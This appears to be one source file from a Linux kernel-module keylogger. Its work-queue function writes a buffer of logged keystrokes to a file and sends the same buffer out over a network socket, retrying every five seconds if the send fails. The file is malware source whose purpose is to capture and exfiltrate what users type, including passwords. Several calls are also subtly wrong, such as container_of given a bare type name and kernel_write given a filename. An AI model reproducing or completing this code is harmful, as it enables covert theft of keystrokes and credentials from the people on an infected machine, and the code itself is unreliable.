#include "write_to_file.h"

void write_to_file(struct work_struct* work){
    struct KEYLOGGER* klogger;
    klogger=container_of(work,KEYLOGGER,work_struct);
    kernel_write(klogger->filename,klogger->write_buffer,BUFF_SIZE,&(klogger->offset_in_file));


    struct msghdr mes;
    struct kvec vec;
    int sent_bytes;


    memset(&mes,0,sizeof(mes));
    vec.iov_base = klogger->write_buffer;
    vec.iov_len = BUFF_SIZE;


    sent_bytes=kernel_sendmsg(klogger->socket,&mes,&vec,1,BUFF_SIZE);
    if (sent_bytes < 0) {
        pr_err("Error sending data over socket. Scheduling retry...\n");
        schedule_delayed_work(&klogger->work_struct, msecs_to_jiffies(5000)); // Retry in 5 secunde
    }
}